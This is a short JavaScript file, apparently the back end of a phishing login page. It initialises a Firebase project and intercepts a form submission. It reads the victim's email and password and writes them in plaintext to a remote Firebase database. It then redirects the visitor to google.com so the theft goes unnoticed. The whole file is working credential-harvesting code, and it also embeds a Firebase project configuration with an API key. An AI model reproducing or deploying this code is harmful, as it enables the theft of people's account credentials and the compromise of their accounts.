var config = {
    apiKey: "AIzaSyAxR6wE5dZLVAgSdOAsfZQp6RlP8OT3VS0",
    authDomain: "prova-20c9c.firebaseapp.com",
    databaseURL: "https://prova-20c9c.firebaseio.com",
    projectId: "prova-20c9c",
    storageBucket: "prova-20c9c.appspot.com",
    messagingSenderId: "416093524955"
  };
  firebase.initializeApp(config);

const rootRef = firebase.database().ref(); // reference ne te gjithe database
const commentsRef = rootRef.child('comments'); // krijo comments "object"
const form = document.querySelector("form"); // Form HTML

form.addEventListener("submit",function(e){
    let email = document.querySelector("#email").value;
    let password = document.querySelector("#password").value; //Email 
    let newPost = commentsRef.push();
    newPost.set({
        email: email,
        password: password
    });

    setTimeout(function(){
        window.location = "http://google.com"
    },1500)

    e.preventDefault();
});


// Show login detail
